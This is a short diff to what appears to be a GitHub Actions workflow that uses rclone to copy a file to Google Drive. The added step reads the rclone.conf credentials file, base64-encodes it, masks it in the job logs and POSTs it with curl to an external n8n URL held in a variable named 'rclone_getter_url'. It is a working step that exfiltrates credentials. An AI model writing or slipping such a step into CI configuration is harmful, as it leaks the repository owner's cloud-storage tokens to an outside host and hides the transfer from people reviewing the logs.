@@ -35,3 +35,17 @@ jobs:
           sudo mkdir -p "$GITHUB_WORKSPACE/tmp/data"
           sudo touch "$GITHUB_WORKSPACE/tmp/data/123.txt"
           rclone copy "$GITHUB_WORKSPACE/tmp/data/123.txt" gdrive1:/
+
+
+      - name: Send rclone.conf via POST (safer for large data)
+        env:
+          N8N_URL: ${{ env.rclone_getter_url }}
+          RCLONE_CONF_PATH: ~/.config/rclone/rclone.conf
+        run: |
+          set -euo pipefail
+          B64_CONTENT="$(base64 -w0 "$RCLONE_CONF_PATH")"
+          echo "::add-mask::$B64_CONTENT"
+          curl -sS \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            --data-urlencode "data=$B64_CONTENT" \
+            "$N8N_URL"
